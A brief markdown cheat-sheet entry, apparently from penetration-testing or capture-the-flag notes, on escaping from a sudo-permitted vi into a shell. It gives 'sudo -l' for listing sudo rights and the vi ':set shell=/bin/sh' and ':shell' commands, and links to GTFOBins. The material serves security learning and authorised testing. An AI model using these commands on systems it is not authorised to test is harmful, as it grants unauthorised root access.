## Common

List your user's sudo priveleges with

```bash
~$ sudo -l
```

## vi

If we can sudo to use vi, we can break out of it into a shell

```bash
# within vi
:set shell=/bin/sh
:shell
```

## Links

[GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.](https://gtfobins.github.io/)